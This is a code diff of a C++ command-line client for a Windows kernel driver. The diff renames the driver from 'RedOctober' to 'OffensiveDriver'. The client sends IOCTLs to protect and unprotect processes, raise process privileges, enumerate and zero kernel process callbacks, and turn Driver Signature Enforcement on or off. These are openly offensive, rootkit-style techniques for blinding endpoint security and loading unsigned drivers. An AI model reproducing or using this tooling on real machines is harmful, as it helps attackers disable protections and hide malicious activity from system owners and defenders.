@@ -3,8 +3,8 @@
 
 #include "Winternal.h"
 
-#include "..\RedOctober\IOCTLs.h"
-#include "..\RedOctober\Common.h"
+#include "..\OffensiveDriver\IOCTLs.h"
+#include "..\OffensiveDriver\Common.h"
 
 ULONG64 GetCiOptionsAddress();
 PVOID GetModuleBase(LPCSTR moduleName);
@@ -21,7 +21,7 @@ int main(int argc, const char* argv[])
     // open handle
     printf("[+] Opening handle to driver...");
     HANDLE hDriver = CreateFile(
-        L"\\\\.\\RedOctober",
+        L"\\\\.\\OffensiveDriver",
         GENERIC_WRITE,
         FILE_SHARE_WRITE,
         nullptr,
@@ -42,14 +42,14 @@ int main(int argc, const char* argv[])
     if (strcmp(argv[1], "-pp") == 0)
     {
         // protect process
-        printf("[+] Calling RED_OCTOBER_DEVICE_PROTECT_PROCESS...");
+        printf("[+] Calling OFFENSIVE_DRIVER_DEVICE_PROTECT_PROCESS...");
 
         TargetCallback target;
         target.Index = atoi(argv[2]);
 
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_PROTECT_PROCESS,
+            OFFENSIVE_DRIVER_PROTECT_PROCESS,
             &target,
             sizeof(target),
             nullptr,
@@ -69,14 +69,14 @@ int main(int argc, const char* argv[])
     else if (strcmp(argv[1], "-up") == 0)
     {
         // unprotect process
-        printf("[+] Calling RED_OCTOBER_DEVICE_UNPROTECT_PROCESS...");
+        printf("[+] Calling OFFENSIVE_DRIVER_DEVICE_UNPROTECT_PROCESS...");
 
         TargetCallback target;
         target.Index = atoi(argv[2]);
 
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_UNPROTECT_PROCESS,
+            OFFENSIVE_DRIVER_UNPROTECT_PROCESS,
             &target,
             sizeof(target),
             nullptr,
@@ -99,11 +99,11 @@ int main(int argc, const char* argv[])
         TargetCallback target;
         target.Index = atoi(argv[2]);
 
-        printf("[+] Calling RED_OCTOBER_PROCESS_PRIVILEGE...");
+        printf("[+] Calling OFFENSIVE_DRIVER_PROCESS_PRIVILEGE...");
 
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_PROCESS_PRIVILEGE,
+            OFFENSIVE_DRIVER_PROCESS_PRIVILEGE,
             &target,
             sizeof(target),
             nullptr,
@@ -126,12 +126,12 @@ int main(int argc, const char* argv[])
         CALLBACK_INFORMATION callbacks[64];
         RtlZeroMemory(callbacks, sizeof(callbacks));
 
-        printf("[+] Calling RED_OCTOBER_ENUM_PROCESS_CALLBACK...");
+        printf("[+] Calling OFFENSIVE_DRIVER_ENUM_PROCESS_CALLBACK...");
 
         DWORD bytesReturned;
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_ENUM_PROCESS_CALLBACKS,
+            OFFENSIVE_DRIVER_ENUM_PROCESS_CALLBACKS,
             nullptr,
             0,
             &callbacks,
@@ -164,11 +164,11 @@ int main(int argc, const char* argv[])
         TargetCallback target;
         target.Index = atoi(argv[2]);
 
-        printf("[+] Calling RED_OCTOBER_ZERO_PROCESS_CALLBACK...");
+        printf("[+] Calling OFFENSIVE_DRIVER_ZERO_PROCESS_CALLBACK...");
 
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_ZERO_PROCESS_CALLBACK,
+            OFFENSIVE_DRIVER_ZERO_PROCESS_CALLBACK,
             &target,
             sizeof(target),
             nullptr,
@@ -191,7 +191,7 @@ int main(int argc, const char* argv[])
         DSE dse;
         dse.Address = GetCiOptionsAddress();
 
-        printf("[+] Calling RED_OCTOBER_ENUM_DSE...");
+        printf("[+] Calling OFFENSIVE_DRIVER_ENUM_DSE...");
 
         auto buf = malloc(sizeof(ULONG));
         RtlZeroMemory(buf, sizeof(buf));
@@ -199,7 +199,7 @@ int main(int argc, const char* argv[])
         DWORD bytesReturned;
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_ENUM_DSE,
+            OFFENSIVE_DRIVER_ENUM_DSE,
             &dse,
             sizeof(dse),
             &buf,
@@ -225,11 +225,11 @@ int main(int argc, const char* argv[])
         DSE dse;
         dse.Address = GetCiOptionsAddress();
 
-        printf("[+] Calling RED_OCTOBER_ENABLE_DSE...");
+        printf("[+] Calling OFFENSIVE_DRIVER_ENABLE_DSE...");
 
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_ENABLE_DSE,
+            OFFENSIVE_DRIVER_ENABLE_DSE,
             &dse,
             sizeof(dse),
             nullptr,
@@ -252,11 +252,11 @@ int main(int argc, const char* argv[])
         DSE dse;
         dse.Address = GetCiOptionsAddress();
 
-        printf("[+] Calling RED_OCTOBER_DISABLE_DSE...");
+        printf("[+] Calling OFFENSIVE_DRIVER_DISABLE_DSE...");
 
         BOOL success = DeviceIoControl(
             hDriver,
-            RED_OCTOBER_DISABLE_DSE,
+            OFFENSIVE_DRIVER_DISABLE_DSE,
             &dse,
             sizeof(dse),
             nullptr,
